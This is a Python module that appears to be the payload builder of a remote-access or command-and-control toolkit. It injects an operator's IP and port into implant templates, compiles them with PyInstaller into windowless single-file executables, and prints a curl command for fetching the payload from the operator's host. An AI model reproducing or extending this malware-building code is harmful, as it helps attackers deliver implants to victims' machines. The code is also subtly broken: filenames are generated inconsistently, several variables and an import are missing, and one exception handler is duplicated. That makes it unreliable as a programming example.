import random
import shutil
import string
import os
from config.colours import success, error, info, process, console


def set_server_addr(server_ip, server_port):
    global host_ip, host_port
    host_ip = server_ip
    host_port = server_port


def gen_filename():
    """Creates a random file name

    Returns:
        file_name: random filename
        generated: generated filename with path
    """
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    generated = f'Generated Payloads/{file_name}'
    return file_name, generated


def make_file(implant_name):
    """Generates a payload based on command/implant type

    Args:
        type (string): creates a file with a random name
    """
    file_name = gen_filename()[0]
    generated = gen_filename()[1]
    try:
        shutil.copy(f'implants/{implant_name}', generated)

        # Write IP to file
        with open(generated) as f:
            new_host = f.read().replace('INPUT_IP_HERE', host_ip)

        with open(generated, 'w') as f:
            f.write(new_host)
            f.close()

        # Write Port to file
        with open(generated) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)

        with open(generated, 'w') as f:
            f.write(new_port)
            f.close()

        success(f'Payload {file_name} Created at {generated}')
        
    except FileNotFoundError:
        error(f"File Not Found: {implant_name}")
        pass


def make_exe(implant_name):
    """Generate an Executable

    Args:
        implant_name (string): takes in a name then generates an executable from it
    """
    file_name = gen_filename()[0]
    generated = gen_filename()[1]
    try:
        shutil.copy(f'implants/{implant_name}', generated)

        # Write IP to file
        with open(generated) as f:
            new_host = f.read().replace('INPUT_IP_HERE', host_ip)

        with open(generated, 'w') as f:
            f.write(new_host)
            f.close()

        # Write Port to file
        with open(generated) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)

        with open(generated, 'w') as f:
            f.write(new_port)
            f.close()

        success(f'Payload {file_name} Created at {generated}')
        
        if os.path.exists(generated):
            success(f"{file_name} saved to {generated}")
        else:
            error("Error occurred during payload generation")

        # PyInstaller Command Handling
        pyinstaller_exec = f'pyinstaller "Generated Payloads/{file_name}" -w --clean --onefile --distpath .'
        process(f"Generating Executable {exe_file}...")
        subprocess.call(pyinstaller_exec, shell=True, stderr=subprocess.DEVNULL)
        os.remove(f'{ran_name}.spec')
        shutil.rmtree('build')
        os.replace(f'{exe_file}', f'Generated Payloads/{exe_file}')
        try:
            if os.path.exists(f'Generated Payloads/{ran_name}.exe'):
                success(f"Executable Generated to Generated Payloads Directory: {exe_file}")
                info(f"[link]curl http://{host_ip}:PORT/{file_name} -o {file_name}")

            else:
                error("Executable Generation Failed")
        except FileNotFoundError:
            error("Executable Generation Failed")
            
    except FileNotFoundError:
        error("File Not Found - winpy.py")
        pass
        
    except FileNotFoundError:
        error(f"File Not Found - {implant_name}")
        pass